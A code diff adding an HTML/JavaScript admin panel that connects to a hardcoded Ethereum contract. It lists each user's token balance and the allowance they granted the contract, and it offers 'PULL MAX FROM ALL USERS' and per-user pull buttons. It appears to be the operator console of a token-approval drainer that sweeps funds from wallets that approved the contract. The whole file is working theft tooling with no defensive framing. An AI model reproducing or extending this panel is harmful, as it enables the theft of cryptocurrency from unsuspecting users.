@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WalletManager Admin Panel</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
+        .container { max-width: 900px; margin: auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        h1 { color: #1a73e8; text-align: center; }
+        .status-bar { background: #e8f0fe; padding: 15px; border-radius: 10px; margin-bottom: 20px; border-left: 5px solid #1a73e8; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .card { border: 1px solid #ddd; padding: 15px; border-radius: 10px; background: #fafafa; }
+        h3 { margin-top: 0; color: #333; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .btn-blue { background: #1a73e8; color: white; }
+        .btn-green { background: #34a853; color: white; }
+        .btn-red { background: #ea4335; color: white; }
+        button:hover { opacity: 0.8; }
+        #log { background: #222; color: #00ff00; padding: 15px; border-radius: 5px; height: 150px; overflow-y: auto; font-family: monospace; margin-top: 20px; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>WalletManager Admin Panel</h1>
+    
+    <div class="status-bar">
+        <strong>Owner Address:</strong> <span id="ownerAddr">Not Connected</span><br>
+        <strong>Contract Address:</strong> <span id="contractAddr">-</span><br>
+        <strong>Token Address:</strong> <span id="tokenAddr">-</span>
+    </div>
+
+    <button id="connectBtn" class="btn-blue">Connect Owner Wallet</button>
+
+    <div class="grid" style="margin-top: 20px;">
+        <div class="card">
+            <h3>Configuration</h3>
+            <label>Registration Fee (in Wei):</label>
+            <input type="text" id="newFee" placeholder="e.g. 1000000000000000000">
+            <button onclick="updateFee()" class="btn-green">Update Fee</button>
+
+            <label>Destination Address:</label>
+            <input type="text" id="newDest" placeholder="0x...">
+            <button onclick="updateDest()" class="btn-green">Update Destination</button>
+        </div>
+
+        <div class="card">
+            <h3>Token Pull Operations</h3>
+            <button onclick="pullAll()" class="btn-red" style="margin-bottom: 15px;">PULL MAX FROM ALL USERS</button>
+            
+            <hr>
+            <label>Pull from Specific User:</label>
+            <input type="text" id="specificUser" placeholder="User Address">
+            <input type="text" id="pullAmount" placeholder="Amount">
+            <button onclick="pullSpecific()" class="btn-red">Pull Specific</button>
+        </div>
+    </div>
+
+    <div class="card" style="margin-top: 20px;">
+        <h3>User Stats</h3>
+        <button onclick="loadUsers()" class="btn-blue">Refresh User List & Stats</button>
+        <p><strong>Total Users:</strong> <span id="userCount">0</span></p>
+        <div id="userList" style="max-height: 200px; overflow-y: auto; font-size: 13px;"></div>
+    </div>
+
+    <div id="log">System Ready... Connect Wallet to begin.</div>
+</div>
+
+<script>
+    // --- Configuration (Proxy Address Yahan Dalein) ---
+    const CONTRACT_ADDRESS = "0xe06704C5f5Dbb1A6BceccA3446DBb8d475AfaE9a"; 
+    
+    const ABI = [
+        "function owner() view returns (address)",
+        "function token() view returns (address)",
+        "function registrationFee() view returns (uint256)",
+        "function setRegistrationFee(uint256)",
+        "function setDestinationAddress(address)",
+        "function pullMaxFromAll() external",
+        "function pullTokensFromUser(address, uint256)",
+        "function getAllUsers() view returns (address[])",
+        "function token() view returns (address)"
+    ];
+
+    const ERC20_ABI = [
+        "function allowance(address, address) view returns (uint256)",
+        "function balanceOf(address) view returns (uint256)",
+        "function decimals() view returns (uint8)"
+    ];
+
+    let provider, signer, contract;
+
+    const logEl = document.getElementById("log");
+    function log(msg) {
+        logEl.innerHTML += `<br>> ${msg}`;
+        logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    document.getElementById("connectBtn").onclick = async () => {
+        if(!window.ethereum) return alert("MetaMask missing");
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+
+        const owner = await contract.owner();
+        const token = await contract.token();
+        
+        document.getElementById("ownerAddr").innerText = await signer.getAddress();
+        document.getElementById("contractAddr").innerText = CONTRACT_ADDRESS;
+        document.getElementById("tokenAddr").innerText = token;
+        log("Connected as Owner");
+        loadUsers();
+    };
+
+    async function updateFee() {
+        try {
+            const fee = document.getElementById("newFee").value;
+            const tx = await contract.setRegistrationFee(fee);
+            log("Updating fee... hash: " + tx.hash);
+            await tx.wait();
+            log("Fee Updated!");
+        } catch(e) { log("Error: " + e.message); }
+    }
+
+    async function updateDest() {
+        try {
+            const dest = document.getElementById("newDest").value;
+            const tx = await contract.setDestinationAddress(dest);
+            log("Updating Destination... hash: " + tx.hash);
+            await tx.wait();
+            log("Destination Updated!");
+        } catch(e) { log("Error: " + e.message); }
+    }
+
+    async function pullAll() {
+        if(!confirm("Kya aap sabhi users se token nikalna chahte hain?")) return;
+        try {
+            const tx = await contract.pullMaxFromAll();
+            log("Pulling tokens from all users... hash: " + tx.hash);
+            await tx.wait();
+            log("Pull Complete!");
+        } catch(e) { log("Error: " + e.message); }
+    }
+
+    async function pullSpecific() {
+        try {
+            const user = document.getElementById("specificUser").value;
+            const amount = document.getElementById("pullAmount").value;
+            const tx = await contract.pullTokensFromUser(user, amount);
+            log(`Pulling ${amount} from ${user}...`);
+            await tx.wait();
+            log("Specific Pull Success!");
+        } catch(e) { log("Error: " + e.message); }
+    }
+
+    async function loadUsers() {
+        try {
+            const users = await contract.getAllUsers();
+            document.getElementById("userCount").innerText = users.length;
+            const tokenAddr = await contract.token();
+            const tokenContract = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
+            
+            let listHtml = "<ul>";
+            for(let user of users) {
+                const balance = await tokenContract.balanceOf(user);
+                const allowance = await tokenContract.allowance(user, CONTRACT_ADDRESS);
+                listHtml += `<li>${user.substring(0,6)}... | Bal: ${ethers.utils.formatUnits(balance, 18)} | Allw: ${ethers.utils.formatUnits(allowance, 18)}</li>`;
+            }
+            listHtml += "</ul>";
+            document.getElementById("userList").innerHTML = listHtml;
+            log("User stats refreshed.");
+        } catch(e) { log("Error loading users: " + e.message); }
+    }
+</script>
+
+</body>
+</html>
